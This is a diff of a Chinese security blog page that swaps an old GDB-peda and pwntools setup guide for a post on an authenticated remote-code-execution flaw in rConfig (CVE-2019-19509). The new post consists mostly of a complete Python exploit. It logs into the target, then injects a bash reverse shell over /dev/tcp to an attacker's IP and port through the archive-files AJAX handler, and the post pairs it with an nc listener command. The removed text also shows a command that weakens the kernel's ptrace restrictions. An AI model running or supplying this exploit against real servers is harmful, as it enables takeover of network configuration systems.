@@ -2,9 +2,9 @@
 <html>
 <head>
   <meta charset="utf-8">
-  <title>Peda 安装指南 | 古萌</title>
-  <meta name="keywords" content=" Exploit ">
-  <meta name="description" content="Peda 安装指南 | 古萌">
+  <title>rconfig用户登录认证RCE漏洞 | 古萌</title>
+  <meta name="keywords" content="">
+  <meta name="description" content="rconfig用户登录认证RCE漏洞 | 古萌">
     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
 <meta name="description" content="关于对博客世界的理解这个世界从HTML 1.0、2.0、3.0，不断进化的前端给人类的交流带来的新奇特殊的方式，这里借用王国维大师关于人生的三种境界：  古今之成大事业、大学问者，必经过三种之境界：   “昨夜西风凋碧树。独上高楼，望尽天涯路”，此第一境也。 “衣带渐宽终不悔，为伊消得人憔悴”，此第二境也。 “众里寻他千百度，蓦然回首，那人却在，灯火阑珊处”，此第三境也。此等语皆非大词人不能道。然">
 <meta property="og:type" content="website">
@@ -462,31 +462,19 @@
 </aside>
 <div class="post">
     <div class="pjax">
-        <article id="post-gdb-peda-pwntools安装使用问题" class="article article-type-post" itemscope itemprop="blogPost">
+        <article id="post-rconfig用户登录认证RCE漏洞" class="article article-type-post" itemscope itemprop="blogPost">
     
-        <h1 class="article-title">Peda 安装指南</h1>
+        <h1 class="article-title">rconfig用户登录认证RCE漏洞</h1>
     
     <div class="article-meta">
         
         
         
-        <span class="book">
-            
-                <a  data-rel="tools">tools</a>
-            
-        </span>
-        
-        
-        <span class="tag">
-            
-            <a class="color3">Exploit</a>
-            
-        </span>
         
     </div>
     <div class="article-meta">
         
-        创建时间:<time class="date" title='更新时间: 2020-04-06 16:05:19'>2018-06-15 09:50</time>
+        创建时间:<time class="date" title='更新时间: 2020-04-06 21:14:12'>2020-04-06 19:39</time>
         
     </div>
     <div class="article-meta">
@@ -508,7 +496,7 @@
     
     <div class="toc-ref">
     
-        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Peda-安装使用指南"><span class="toc-text">Peda 安装使用指南</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#GDB-peda安装"><span class="toc-text">GDB-peda安装</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#pwntools-error"><span class="toc-text">pwntools error</span></a></li></ol></li></ol>
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Rconfig-登录管理服务器RCE漏洞"><span class="toc-text">Rconfig 登录管理服务器RCE漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x01-漏洞原理"><span class="toc-text">0x01 漏洞原理</span></a></li></ol></li></ol>
     
 <style>
     .left-col .switch-btn,
@@ -524,50 +512,37 @@
     
     <div class="article-entry" itemprop="articleBody">
       
-        <h1 id="Peda-安装使用指南"><a href="#Peda-安装使用指南" class="headerlink" title="Peda 安装使用指南"></a>Peda 安装使用指南</h1><p>参考连接：<br><a href="http://www.ropshell.com/peda/Linux_Interactive_Exploit_Development_with_GDB_and_PEDA_Slides.pdf" target="_blank" rel="noopener" title="peda-pdf">http://www.ropshell.com/peda/Linux_Interactive_Exploit_Development_with_GDB_and_PEDA_Slides.pdf</a></p>
-<p>Peda的创作者是Long Le ，vns security的研究员，</p>
-<h2 id="GDB-peda安装"><a href="#GDB-peda安装" class="headerlink" title="GDB-peda安装"></a>GDB-peda安装</h2><p>1 需要安装packages </p>
-<blockquote>
-<p>sudo apt-get install nasm micro-inetd</p>
+        <h1 id="Rconfig-登录管理服务器RCE漏洞"><a href="#Rconfig-登录管理服务器RCE漏洞" class="headerlink" title="Rconfig 登录管理服务器RCE漏洞"></a>Rconfig 登录管理服务器RCE漏洞</h1><blockquote>
+<p>涉及两个CVE，CVE-2020-10220 / CVE-2019-19509</p>
 </blockquote>
-<p>2 可选安装</p>
+<p>&emsp;&emsp; rconfig.com 开源设备认证管理系统组件</p>
 <blockquote>
-<p>sudo apt-get install libc6-dbg vim ssh</p>
+<p>&emsp;&emsp;rConfig is an open source network device configuration management utility for network engineers to take frequent configuration snapshots of their network devices. rConfig is unique, because you choose what commands you want to run against your devices.</p>
 </blockquote>
-<p>3 安装peda-tool </p>
+<p>重点参考：</p>
+<ol>
+<li><a href="https://github.com/v1k1ngfr/exploits-rconfig" target="_blank" rel="noopener">https://github.com/v1k1ngfr/exploits-rconfig</a></li>
+<li><a href="https://www.exploit-db.com/exploits/48223" target="_blank" rel="noopener">https://www.exploit-db.com/exploits/48223</a></li>
+</ol>
+<h2 id="0x01-漏洞原理"><a href="#0x01-漏洞原理" class="headerlink" title="0x01 漏洞原理"></a>0x01 漏洞原理</h2><ol>
+<li><p>如何安装rconfig软件，参考<a href="https://rconfig.com/" target="_blank" rel="noopener">https://rconfig.com/</a><br><img src="/img/rconfig_dashboard.png" alt="Rconfig界面"></p>
+</li>
+<li><p>提交系统登录数据</p>
+</li>
+</ol>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">login_request = request.post(</span><br><span class="line">    target+<span class="string">"/lib/crud/userprocess.php"</span>,</span><br><span class="line">     login_info,</span><br><span class="line">     <span class="attribute">verify</span>=<span class="literal">False</span>,</span><br><span class="line">     <span class="attribute">allow_redirects</span>=<span class="literal">True</span></span><br><span class="line"> )</span><br></pre></td></tr></table></figure>
+
+<p>&emsp;&emsp;登录/lib/crud/userprocess.php页面后，完成登录页面后，利用ajax交互数据</p>
+<ol start="3">
+<li>在系统dashboard页面，在回连IP的开个监听端口</li>
+</ol>
 <blockquote>
-<p>Download peda.tar.gz at: <a href="http://ropshell.com/peda/" target="_blank" rel="noopener">http://ropshell.com/peda/</a></p>
+<p>nc -lvp 8081 </p>
 </blockquote>
-<p>本地打开</p>
-<blockquote>
-<p>$ tar zxvf peda.tar.gz</p>
-</blockquote>
-<p>创建 本地’.gdbinit’</p>
-<blockquote>
-<p>$ echo “source <del>/peda/peda.py” &gt;</del>/.gdbinit</p>
-</blockquote>
-<p>本地可用的example</p>
-<blockquote>
-<p>Download bhus12-workshop.tar.gz at:</p>
-</blockquote>
-<blockquote>
-<p><a href="http://ropshell.com/peda/" target="_blank" rel="noopener">http://ropshell.com/peda/</a></p>
-</blockquote>
-<h2 id="pwntools-error"><a href="#pwntools-error" class="headerlink" title="pwntools error"></a>pwntools error</h2><p>Thanks for contributing to Pwntools!</p>
-<p>When reporting an issue, be sure that you are running the latest released version of pwntools (pip install –upgrade pwntools).</p>
-<p>Please verify that your issue occurs on 64-bit Ubuntu 14.04. You can use the Dockerfile on docker.io for quick testing.</p>
-<pre><code>$ docker pull pwntools/pwntools:stable
-$ docker run -it pwntools/pwntools:stable</code></pre><p>If possible, provide a proof-of-concept which demonstrates the problem. Include any binaries or scripts necessary to reproduce the issue, and please include the full debug output via setting the environment variable PWNLIB_DEBUG=1.</p>
-<p>pwntool gdb attach </p>
-<p>82<br>down vote<br>accepted<br>In Maverick Meerkat (10.10) Ubuntu introduced a patch to disallow ptracing of non-child processes by non-root users - ie. only a process which is a parent of another process can ptrace it for normal users - whilst root can still ptrace every process. Hence why you can use gdb to attach via sudo still.</p>
-<p>You can temporarily disable this restriction (and revert to the old behaviour allowing your user to ptrace (gdb) any of their other processes) by doing:</p>
-<p>echo 0 | sudo tee /proc/sys/kernel/yama/ptrace_scope<br>To permanently allow it edit /etc/sysctl.d/10-ptrace.conf and change the line:</p>
-<p>kernel.yama.ptrace_scope = 1<br>To read</p>
-<p>kernel.yama.ptrace_scope = 0<br>For some background on why this change was made, see the Ubuntu wiki</p>
-<p>.plt 表示一个函数在libc中的偏移位置，如下代码:</p>
-<p>.plt:080483A0 ; ssize_t write(int fd, const void *buf, size_t n)<br>.plt:080483A0 _write          proc near               ; CODE XREF: main+2Ap<br>.plt:080483A0                 jmp     ds:off_804A010<br>.plt:080483A0 _write          endp</p>
-<p>指向了got.plt中的地址，got.plt则指向了plt的实际调用地址，外部调用函数偏移量：<br>.got.plt:0804A010 off_804A010     dd offset write         ; DATA XREF: _writer</p>
-<p>外部函数的偏移量则为：</p>
+<figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta-keyword">/lib/</span>ajaxHandlers/ajaxArchiveFiles.php?path=&#123;Shellcode Youself Define&#125;<span class="variable">&amp;ext</span>=random</span><br></pre></td></tr></table></figure>
+<p>&emsp;&emsp;Shellcode 必须回连到你的IP/端口上，然年就Getshell了，很简单是不是！</p>
+<p>&emsp;&emsp;这个Bug存在于Rconfig登录ajax函数梳理流程上，有兴趣的小伙伴可以自己找找看，具体Getshell的函数在哪里。</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">import sys</span><br><span class="line">import urllib.parse</span><br><span class="line">from requests.packages.urllib3.exceptions import InsecureRequestWarning</span><br><span class="line">requests.packages.urllib3.disable_warnings(InsecureRequestWarning)</span><br><span class="line"></span><br><span class="line">print (<span class="string">"rconfig - CVE-2019-19509 - Web authenticated RCE"</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> len(sys.argv) != <span class="number">6</span>:</span><br><span class="line">    print (<span class="string">"[+] Usage : ./rconfig_exploit.py https://target username password yourIP yourPort"</span>)</span><br><span class="line">    <span class="keyword">exit</span>()</span><br><span class="line"></span><br><span class="line">target = sys.argv[<span class="number">1</span>] <span class="comment"># 被攻击的目标IP</span></span><br><span class="line">username = sys.argv[<span class="number">2</span>] <span class="comment"># 用户名</span></span><br><span class="line">password = sys.argv[<span class="number">3</span>] <span class="comment"># 密码</span></span><br><span class="line">ip = sys.argv[<span class="number">4</span>] <span class="comment"># 回连的IP地址</span></span><br><span class="line">port = sys.argv[<span class="number">5</span>] <span class="comment"># 回连的端口号</span></span><br><span class="line">payload = <span class="string">'''`bash -i&gt;&amp; /dev/tcp/&#123;0&#125;/&#123;1&#125; 0&gt;&amp;1`'''</span>.format(ip, port)</span><br><span class="line"></span><br><span class="line">request = requests.session()</span><br><span class="line"></span><br><span class="line">login_info = &#123;</span><br><span class="line">    <span class="string">"user"</span>: username,</span><br><span class="line">    <span class="string">"pass"</span>: password,</span><br><span class="line">    <span class="string">"sublogin"</span>: <span class="number">1</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">login_request = request.post(</span><br><span class="line">    target+<span class="string">"/lib/crud/userprocess.php"</span>,</span><br><span class="line">     login_info,</span><br><span class="line">     verify=False,</span><br><span class="line">     allow_redirects=True</span><br><span class="line"> )</span><br><span class="line"></span><br><span class="line">dashboard_request = request.get(target+<span class="string">"/dashboard.php"</span>, allow_redirects=False)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> dashboard_request.status_code == <span class="number">200</span>:</span><br><span class="line">    print (<span class="string">"[+] Logged in successfully, triggering the payload..."</span>)</span><br><span class="line">    encoded_request = target+<span class="string">"/lib/ajaxHandlers/ajaxArchiveFiles.php?path=&#123;0&#125;&amp;ext=random"</span>.format(urllib.parse.quote(payload))</span><br><span class="line">    print (<span class="string">"[+] Check your listener !"</span>)</span><br><span class="line">    exploit_req = request.get(encoded_request)</span><br><span class="line"></span><br><span class="line">elif dashboard_request.status_code == <span class="number">302</span>:</span><br><span class="line">    print (<span class="string">"[-] Wrong credentials !"</span>)</span><br><span class="line">    <span class="keyword">exit</span>()</span><br></pre></td></tr></table></figure>
 
       
        <hr><span style="font-style: italic;color: gray;"> 转载请注明来源，欢迎对文章中的引用来源进行考证，欢迎指出任何有错误或不够清晰的表达。可以在下面评论区评论，也可以邮件至 youngcraft@qq.com </span>
@@ -581,12 +556,12 @@ $ docker run -it pwntools/pwntools:stable</code></pre><p>If possible, provide a 
 
 
 <div class="article_copyright">
-    <p><span class="copy-title">文章标题:</span>Peda 安装指南</p>
+    <p><span class="copy-title">文章标题:</span>rconfig用户登录认证RCE漏洞</p>
     
     <p><span class="copy-title">本文作者:</span><a  title="古萌">古萌</a></p>
-    <p><span class="copy-title">发布时间:</span>2018-06-15, 09:50:08</p>
-    <p><span class="copy-title">最后更新:</span>2020-04-06, 16:05:19</p>
-    <span class="copy-title">原始链接:</span><a class="post-url" href="/2018/06/15/gdb-peda-pwntools%E5%AE%89%E8%A3%85%E4%BD%BF%E7%94%A8%E9%97%AE%E9%A2%98/" title="Peda 安装指南">http://gumeng.fun/2018/06/15/gdb-peda-pwntools%E5%AE%89%E8%A3%85%E4%BD%BF%E7%94%A8%E9%97%AE%E9%A2%98/</a>
+    <p><span class="copy-title">发布时间:</span>2020-04-06, 19:39:28</p>
+    <p><span class="copy-title">最后更新:</span>2020-04-06, 21:14:12</p>
+    <span class="copy-title">原始链接:</span><a class="post-url" href="/2020/04/06/rconfig%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%95%E8%AE%A4%E8%AF%81RCE%E6%BC%8F%E6%B4%9E/" title="rconfig用户登录认证RCE漏洞">http://gumeng.fun/2020/04/06/rconfig%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%95%E8%AE%A4%E8%AF%81RCE%E6%BC%8F%E6%B4%9E/</a>
     <p>
         <span class="copy-title">版权声明:</span><i class="fa fa-creative-commons"></i> <a rel="license noopener" href="http://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank" title="CC BY-NC-SA 4.0 International" target = "_blank">"署名-非商用-相同方式共享 4.0"</a> 转载请保留原文链接及作者。
     </p>
